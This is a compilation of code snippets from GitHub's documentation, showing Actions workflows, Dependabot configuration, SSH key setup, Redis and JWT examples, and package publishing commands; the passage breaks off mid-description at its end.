Node.js\nDESCRIPTION: This Node.js script creates a Redis client, connects to a Redis service using environment variables for host and port, sets key-value pairs, sets hash fields, and retrieves hash keys to verify the Redis connection and data storage. The redis npm module is required. It prints the replies to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require(\"redis\");\n\n// Creates a new Redis client\n// If REDIS_HOST is not set, the default host is localhost\n// If REDIS_PORT is not set, the default port is 6379\nconst redisClient = redis.createClient({\n  url: `redis://${process.env.REDIS_HOST}:${process.env.REDIS_PORT}`\n});\n\nredisClient.on(\"error\", (err) => console.log(\"Error\", err));\n\n(async () => {\n  await redisClient.connect();\n\n  // Sets the key \"octocat\" to a value of \"Mona the octocat\"\n  const setKeyReply = await redisClient.set(\"octocat\", \"Mona the Octocat\");\n  console.log(\"Reply: \" + setKeyReply);\n  // Sets a key to \"species\", field to \"octocat\", and \"value\" to \"Cat and Octopus\"\n  const SetFieldOctocatReply = await redisClient.hSet(\"species\", \"octocat\", \"Cat and Octopus\");\n  console.log(\"Reply: \" + SetFieldOctocatReply);\n  // Sets a key to \"species\", field to \"dinotocat\", and \"value\" to \"Dinosaur and Octopus\"\n  const SetFieldDinotocatReply = await redisClient.hSet(\"species\", \"dinotocat\", \"Dinosaur and Octopus\");\n  console.log(\"Reply: \" + SetFieldDinotocatReply);\n  // Sets a key to \"species\", field to \"robotocat\", and \"value\" to \"Cat and Robot\"\n  const SetFieldRobotocatReply = await redisClient.hSet(\"species\", \"robotocat\", \"Cat and Robot\");\n  console.log(\"Reply: \" + SetFieldRobotocatReply);\n\n  try {\n    // Gets all fields in \"species\" key\n    const replies = await redisClient.hKeys(\"species\");\n    console.log(replies.length + \" replies:\");\n    replies.forEach((reply, i) => {\n        console.log(\"    \" + i + \": \" + reply);\n    });\n    await redisClient.quit();\n  }\n  catch (err) {\n    // statements to handle any exceptions\n  }\n})();\n```\n\n----------------------------------------\n\nTITLE: Using `rest` Endpoint Methods in Ruby\nDESCRIPTION: This shows how to use the `rest` endpoint methods in Octokit to make API requests.  It uses the `issues.list_for_repo` method to retrieve issues for a repository.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\noctokit.rest.issues.list_for_repo(owner: \"github\", repo: \"docs\", per_page: 2)\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository with Git\nDESCRIPTION: This snippet demonstrates how to clone a remote repository to your local machine using the `git clone` command.  The command creates a new directory, initializes a Git repository within it, sets the remote `origin` to the cloned URL, and downloads all files and commits.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/getting-changes-from-a-remote-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/USERNAME/REPOSITORY.git\n# Clones a repository to your computer\n```\n\n----------------------------------------\n\nTITLE: Set GitHub PAT Environment Variable in Terminal\nDESCRIPTION: This snippet demonstrates how to set the GitHub Personal Access Token (PAT) as an environment variable named `GH_PAT` in a Terminal environment. It utilizes the `export` command, which makes the variable available to subsequent commands in the current shell session. Replace `TOKEN` with the actual PAT value.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/grant-migrator-role-pat.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nexport GH_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_SERVER_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_SERVER_URL` to the GitHub Actions equivalent `${{ github.server_url }}`.  Provides the URL of the GitHub Actions server.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_48\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}\n```\n\n----------------------------------------\n\nTITLE: Using the success Status Check Function in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates the use of the `success()` function within an `if` conditional. The `success()` function returns `true` only when all previous steps in the job have succeeded. This ensures that the step will only execute if the job has not encountered any failures.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  ...\n  - name: The job has succeeded\n    if: {% raw %}${{ success() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Caching Yarn Dependencies in GitHub Actions (YAML)\nDESCRIPTION: This workflow caches Yarn dependencies using the `setup-node` action. It checks out the code, configures Node.js with caching enabled for Yarn, installs dependencies using `yarn`, and runs tests using `yarn test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20'\n    cache: 'yarn'\n- run: yarn\n- run: yarn test\n```\n\n----------------------------------------\n\nTITLE: Adding Specific SSH Key for Signing using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to add a specific SSH key located at `~/.ssh/id_ed25519.pub` for commit signing using the GitHub CLI. The `--type signing` option specifies that the key will be used for signing commits.  This command assumes the user has generated an SSH key following GitHub's recommended procedures.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh ssh-key add ~/.ssh/id_ed25519.pub --type signing\n```\n\n----------------------------------------\n\nTITLE: Building and Testing Node.js Code in GitHub Actions (YAML)\nDESCRIPTION: This workflow demonstrates building and testing a Node.js project in GitHub Actions. It checks out the code, configures Node.js, installs dependencies using `npm install`, runs the build script (if present) using `npm run build --if-present`, and executes the test suite using `npm test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20.x'\n- run: npm install\n- run: npm run build --if-present\n- run: npm test\n```\n\n----------------------------------------\n\nTITLE: Publish .NET package to registry\nDESCRIPTION: This workflow publishes a .NET package to {% data variables.product.prodname_registry %}. It triggers on new releases, sets up the .NET environment, builds, creates, and publishes the package. The `GITHUB_TOKEN` secret is used for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nname: Upload dotnet package\n\non:\n  release:\n    types: [created]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-dotnet %}\n        with:\n          dotnet-version: '6.0.x' # SDK Version to use.\n          source-url: https://nuget.pkg.github.com/<owner>/index.json\n        env:\n          NUGET_AUTH_TOKEN: {% raw %}${{secrets.GITHUB_TOKEN}}{% endraw %}\n      - run: dotnet build --configuration Release <my project>\n      - name: Create the package\n        run: dotnet pack --configuration Release <my project>\n      - name: Publish the package to GPR\n        run: dotnet nuget push <my project>/bin/Release/*.nupkg\n```\n\n----------------------------------------\n\nTITLE: Running a data container for SSH key storage\nDESCRIPTION: This command runs a Docker container named `data` based on the `pre-receive.dev` image. This container is used to store the generated SSH key for accessing the Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ndocker run --name data pre-receive.dev /bin/true\n```\n\n----------------------------------------\n\nTITLE: Changing Directory\nDESCRIPTION: This command changes the current working directory to the cloned repository's directory. `YOUR-REPOSITORY` should be replaced with the name of the repository directory.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncd YOUR-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Verifying ssh-agent is Running - Shell\nDESCRIPTION: This command checks if the `ssh-agent` is running by printing the value of the `SSH_AUTH_SOCK` environment variable.  If the variable is set, it indicates that the agent is running.  The variable points to the Unix domain socket used for communication with the agent.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n$ echo \"$SSH_AUTH_SOCK\"\n# Print out the SSH_AUTH_SOCK variable\n> /tmp/launch-kNSlgU/Listeners\n```\n\n----------------------------------------\n\nTITLE: Basic Dependabot Configuration\nDESCRIPTION: This YAML snippet shows the basic structure of a `dependabot.yml` file, including version specification and configuration for updating dependencies for npm and Docker. It demonstrates the minimum required configuration to enable version updates for two package managers, specifying the package ecosystem, directory, and schedule.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/dependabot-options-reference.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Basic `dependabot.yml` file with\n# minimum configuration for two package managers\n\nversion: 2\nupdates:\n  # Enable version updates for npm\n  - package-ecosystem: \"npm\"\n    # Look for `package.json` and `lock` files in the `root` directory\n    directory: \"/\"\n    # Check the npm registry for updates every day (weekdays)\n    schedule:\n      interval: \"daily\"\n\n  # Enable version updates for Docker\n  - package-ecosystem: \"docker\"\n    # Look for a `Dockerfile` in the `root` directory\n    directory: \"/\"\n    # Check for updates once a week\n    schedule:\n      interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Running post-creation commands in devcontainer.json for C# (.NET)\nDESCRIPTION: This code snippet demonstrates how to configure a post-creation command in the `devcontainer.json` file to restore dependencies for the C# (.NET) project using `dotnet restore`. This ensures that the project's dependencies are automatically installed when the codespace is created.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-dotnet-project-for-codespaces.md#_snippet_3\n\nLANGUAGE: JSONC\nCODE:\n```\n   // Use 'postCreateCommand' to run commands after the container is created.\n   \"postCreateCommand\": \"dotnet restore\",\n```\n\n----------------------------------------\n\nTITLE: Enabling Prometheus metrics exporter via command line - Shell\nDESCRIPTION: This snippet demonstrates how to enable the Prometheus metrics exporter and configure trusted IP addresses using the command-line interface within the GitHub Enterprise Server appliance. It uses `ghe-config` commands to set the `app.prometheus.enabled` flag to `true` and specifies a comma-separated list of trusted IP addresses or CIDR blocks for scraping requests. Finally, `ghe-config-apply` applies the changes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/exporting-and-scraping-prometheus-metrics.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config app.prometheus.enabled true\n# Specify a comma-separated list of trusted IPv4/IPv6 addresses or CIDR blocks.\nghe-config app.prometheus.trusted-ips \"10.0.0.1, 192.168.1.0/8\"\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Git LFS Upload Diagnostic Output in Shell\nDESCRIPTION: This snippet provides example output from a `git push` command after a file has been added to Git LFS.  It shows the progress of the file upload, including the amount of data transferred and the estimated time remaining.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/configuring-git-large-file-storage.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n> Sending file.psd\n> 44.74 MB / 81.04 MB  55.21 % 14s\n> 64.74 MB / 81.04 MB  79.21 % 3s\n```\n\n----------------------------------------\n\nTITLE: Testing SSH Connection to GitHub\nDESCRIPTION: This command attempts to establish an SSH connection to GitHub.  It is crucial to verify the host's authenticity by checking the fingerprint to prevent man-in-the-middle attacks. The user is expected to authenticate with their SSH key passphrase. The expected output is a message containing the username if the authentication is successful.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -T git@{% data variables.product.product_url %}\n# Attempts to ssh to {% data variables.product.github %}\n```\n\n----------------------------------------\n\nTITLE: Ignoring Dependency Updates by Version - YAML\nDESCRIPTION: This code snippet shows how to configure Dependabot to ignore updates beyond a specific version of a dependency using the `ignore` option in the `dependabot.yml` file.  It ignores versions of Lodash greater than or equal to 1.0.0, and versions of sphinx within a specific range.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nignore:\n  - dependency-name: \"lodash:*\"\n    # Ignore versions of Lodash that are equal to or greater than 1.0.0\n    versions: [ \">=1.0.0\" ]\n```\n\nLANGUAGE: yaml\nCODE:\n```\nignore:\n  - dependency-name: \"sphinx\"\n    versions: [ \"[1.1,)\" ]\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for PHP Deployment to Azure\nDESCRIPTION: This YAML file defines a GitHub Actions workflow to build and deploy a PHP application to Azure App Service. It triggers on pushes to the `main` branch.  The workflow includes steps for setting up PHP, caching dependencies with Composer, building the application, and deploying it to Azure using the `azure/webapps-deploy` action. Environment variables like `AZURE_WEBAPP_NAME`, `AZURE_WEBAPP_PACKAGE_PATH`, and `PHP_VERSION` can be configured. It leverages reusable actions like `actions/checkout`, `shivammathur/setup-php`, `andstor/file-existence-action`, `actions/cache`, `actions/upload-artifact`, and `actions/download-artifact`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-php-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build and deploy PHP app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  PHP_VERSION: '8.x'                  # set this to the PHP version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Setup PHP\n        uses: shivammathur/setup-php@1f2e3d4c5b6a7f8e9d0c1b2a3e4f5d6c7b8a9e0f\n        with:\n          php-version: {% raw %}${{ env.PHP_VERSION }}{% endraw %}\n\n      - name: Check if composer.json exists\n        id: check_files\n        uses: andstor/file-existence-action@2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b\n        with:\n          files: 'composer.json'\n\n      - name: Get Composer Cache Directory\n        id: composer-cache\n        if: steps.check_files.outputs.files_exists == 'true'\n        run: |\n          echo \"dir=$(composer config cache-files-dir)\" >> $GITHUB_OUTPUT\n\n      - name: Set up dependency caching for faster installs\n        uses: {% data reusables.actions.action-cache %}\n        if: steps.check_files.outputs.files_exists == 'true'\n        with:\n          path: {% raw %}${{ steps.composer-cache.outputs.dir }}{% endraw %}\n          key: {% raw %}${{ runner.os }}-composer-${{ hashFiles('**/composer.lock') }}{% endraw %}\n          restore-keys: |\n            {% raw %}${{ runner.os }}-composer-{% endraw %}\n\n      - name: Run composer install if composer.json exists\n        if: steps.check_files.outputs.files_exists == 'true'\n        run: composer validate --no-check-publish && composer install --prefer-dist --no-progress\n\n      - name: Upload artifact for deployment job\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: php-app\n          path: .\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n      - name: Download artifact from build job\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: php-app\n\n      - name: 'Deploy to Azure Web App'\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n          publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n          package: .\n```\n\n----------------------------------------\n\nTITLE: Decompressing JSON File using gunzip\nDESCRIPTION: This shell command is used to decompress a gzipped JSON file, which is the format of the exported Git events data. It utilizes the `gunzip` utility, a common command-line tool for decompressing files compressed with gzip.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/exporting-audit-log-activity-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngunzip export-avocado-corp-1642896556.json.gz\n```\n\n----------------------------------------\n\nTITLE: Force Pushing to Remote (Safe)\nDESCRIPTION: This command force-pushes the local branch to the remote repository. `--force-with-lease` is the safer option as it prevents overwriting remote changes that you are not aware of.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/using-git-rebase-on-the-command-line.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit push origin main --force-with-lease\n```\n\n----------------------------------------\n\nTITLE: Assigning labels during runner configuration using config.sh\nDESCRIPTION: This code snippet shows how to assign a single label (gpu) during the initial configuration of a self-hosted runner using the `config.sh` script.  This is achieved using the `--labels` parameter. The label is created if it does not already exist.  The script requires the repository URL and a registration token.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/using-labels-with-self-hosted-runners.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --url <REPOSITORY_URL> --token <REGISTRATION_TOKEN> --labels gpu\n```\n\n----------------------------------------\n\nTITLE: Masking and Passing Secrets Between Jobs (PowerShell)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow with two jobs: `secret-generator` and `secret-consumer`, implemented using PowerShell. The first job generates a secret, masks it, and stores it in an imaginary secret store. The second job retrieves the secret from the store and uses it, demonstrating inter-job secret passing with PowerShell.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\non: push\n\njobs:\n  secret-generator:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:{% raw %}\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}{% endraw %}\n    - name: generate secret\n      shell: pwsh\n      run: |\n        Set-Variable -Name Generated_Secret -Value (Get-Random)\n        Write-Output \"::add-mask::$Generated_Secret\"\n        Set-Variable -Name Secret_Handle -Value (Store-Secret \"$Generated_Secret\")\n        \"handle=$Secret_Handle\" >> $env:GITHUB_OUTPUT\n  secret-consumer:\n    runs-on: macos-latest\n    needs: secret-generator\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:{% raw %}\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}{% endraw %}\n    - name: use secret\n      shell: pwsh\n      run: |{% raw %}\n        Set-Variable -Name Secret_Handle -Value \"${{ needs.secret-generator.outputs.handle }}\"\n        Set-Variable -Name Retrieved_Secret -Value (Retrieve-Secret \"$Secret_Handle\")\n        echo \"::add-mask::$Retrieved_Secret\"\n        echo \"We retrieved our masked secret: $Retrieved_Secret\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Setting repository secret from file via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set a repository secret using the GitHub CLI, reading the secret value from a file. The `gh secret set` command redirects the content of `secret.txt` as the secret's value. Requires GitHub CLI installed and authenticated with permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set SECRET_NAME < secret.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring Python registry with token in dependabot.yml\nDESCRIPTION: This snippet configures a Python package index in `dependabot.yml` using a token. It specifies the registry type, URL, and token, which should be stored as a GitHub secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  python-gemfury:\n    type: python-index\n    url: https://pypi.fury.io/my_org\n    token: ${{secrets.MY_GEMFURY_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request target with file path filter\nDESCRIPTION: This workflow triggers when a pull request includes a change to a JavaScript file (`.js`). It demonstrates using the `paths` filter to run workflows when specific files are changed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_33\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_target:\n    paths:\n      - '**.js'\n```\n\n----------------------------------------\n\nTITLE: Generating JWT with PowerShell\nDESCRIPTION: This PowerShell script generates a JWT for authenticating with a GitHub App.  It constructs the header and payload as JSON objects, encodes them using base64, calculates the signature using RSA and SHA256, and concatenates the parts to form the JWT.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app.md#_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\n#!/usr/bin/env pwsh\n\n{% ifversion client-id-for-app %}\n$client_id = YOUR_CLIENT_ID\n{% else %}\n$app_id = YOUR_APP_ID\n{% endif %}\n$private_key_path = \"YOUR_PATH_TO_PEM\"\n\n$header = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{\n  alg = \"RS256\"\n  typ = \"JWT\"\n}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');\n\n$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{\n  iat = [System.DateTimeOffset]::UtcNow.AddSeconds(-10).ToUnixTimeSeconds()\n  exp = [System.DateTimeOffset]::UtcNow.AddMinutes(10).ToUnixTimeSeconds()\n  {% ifversion client-id-for-app %} iss = $client_id {% else %} iss = $app_id {% endif %}\n}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');\n\n$rsa = [System.Security.Cryptography.RSA]::Create()\n$rsa.ImportFromPem((Get-Content $private_key_path -Raw))\n\n$signature = [Convert]::ToBase64String($rsa.SignData([System.Text.Encoding]::UTF8.GetBytes(\"$header.$payload\"), [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)).TrimEnd('=').Replace('+', '-').Replace('/', '_')\n$jwt = \"$header.$payload.$signature\"\nWrite-Host $jwt\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key for a hardware security key - Windows - PowerShell\nDESCRIPTION: This command generates a new SSH key specifically for a hardware security key using the ed25519-sk algorithm and associates it with the provided email address. It requires a hardware security key inserted into the computer.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_10\n\nLANGUAGE: PowerShell\nCODE:\n```\nssh-keygen -t ed25519-sk -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Cloning a repository using SSH with host alias\nDESCRIPTION: This command demonstrates how to clone a repository using SSH with a host alias defined in the SSH configuration file. The alias allows using a specific deploy key associated with the repository. The command uses the alias instead of the actual hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/managing-deploy-keys.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit clone git@{% ifversion fpt or ghec %}github.com{% else %}my-GHE-hostname.com{% endif %}-repo-1:OWNER/repo-1.git\n```\n\n----------------------------------------\n\nTITLE: Explain Git Blame using GitHub Copilot\nDESCRIPTION: This command uses the GitHub Copilot CLI to explain the functionality of the `git blame` command. It relies on the `gh` CLI and a working GitHub Copilot setup. The command takes \"git blame\" as input and returns an explanation of its usage and purpose.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh copilot explain \"git blame\"\n```\n\n----------------------------------------\n\nTITLE: Use multiple .NET versions in workflow\nDESCRIPTION: This workflow uses a matrix strategy to build and test a .NET project against multiple .NET SDK versions (3.1.x and 6.0.x). It sets up each .NET version using `setup-dotnet` action and then displays the current .NET version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup dotnet {% raw %}${{ matrix.dotnet-version }}{% endraw %}\n        uses: {% data reusables.actions.action-setup-dotnet %}\n        with:\n          dotnet-version: {% raw %}${{ matrix.dotnet-version }}{% endraw %}\n      # You can test your matrix by printing the current dotnet version\n      - name: Display dotnet version\n        run: dotnet --version\n```\n\n----------------------------------------\n\nTITLE: Running Inline Python Script (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to run an inline Python script within a GitHub Actions workflow. It uses the `shell` keyword to specify `python` as the shell, allowing for the execution of Python code directly in the `run` step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the path\n    shell: python\n    run: |\n      import os\n      print(os.environ['PATH'])\n```\n\n----------------------------------------\n\nTITLE: Example .npmrc file configuration (Shell)\nDESCRIPTION: This example demonstrates the content of a generated `.npmrc` file, configured to authenticate with a private npm registry. It sets the authentication token, registry for a specific scope, and enables always-auth.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\n@octocat:registry=https://registry.npmjs.org/\nalways-auth=true\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: This snippet demonstrates how to update the GitHub Actions Importer CLI to ensure it's running the latest version from the GitHub Container Registry. It pulls the most recent image to keep the importer up to date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Publishing to RubyGems - Shell Commands\nDESCRIPTION: This shell script creates and configures credentials for RubyGems, builds the gem using `gem build *.gemspec`, and publishes the gem to RubyGems using `gem push`. It relies on the `RUBYGEMS_AUTH_TOKEN` secret for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\nmkdir -p $HOME/.gem\ntouch $HOME/.gem/credentials\nchmod 0600 $HOME/.gem/credentials\nprintf -- \"---\\n:rubygems_api_key: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\ngem build *.gemspec\ngem push *.gem\n```\n\n----------------------------------------\n\nTITLE: Adding a postCreateCommand to devcontainer.json\nDESCRIPTION: This JSON snippet demonstrates how to add a `postCreateCommand` to the `devcontainer.json` file. The `postCreateCommand` property specifies a command to run after the dev container is created.  In this case it configures the container to run `npm install`.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-nodejs-project-for-codespaces.md#_snippet_2\n\nLANGUAGE: jsonc\nCODE:\n```\n// Use 'postCreateCommand' to run commands after the container is created.\n\t\"postCreateCommand\": \"npm install\",\n```\n\n----------------------------------------\n\nTITLE: File Extension and Size Filter Code Search Example\nDESCRIPTION: This example demonstrates how to combine the `extension:` qualifier with a size filter.  It searches for files larger than 200 KB that end in .css and contain the word \"icon.\"\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-code.md#_snippet_1\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?utf8=%E2%9C%93&q=icon+size%3A%3E200000+extension%3Acss&type=Code\n```\n\n----------------------------------------\n\nTITLE: Using a Single Node.js Version\nDESCRIPTION: This example shows how to configure a workflow to use a single, specific version of Node.js. The `node-version` input in the `setup-node` action is set to '20.x', and the matrix strategy is not used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nname: Node.js CI\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Use Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n      - run: npm ci\n      - run: npm run build --if-present\n      - run: npm test\n```\n\n----------------------------------------\n\nTITLE: Example Custom Pattern Non-Matches - Shell\nDESCRIPTION: This shell example demonstrates strings that would 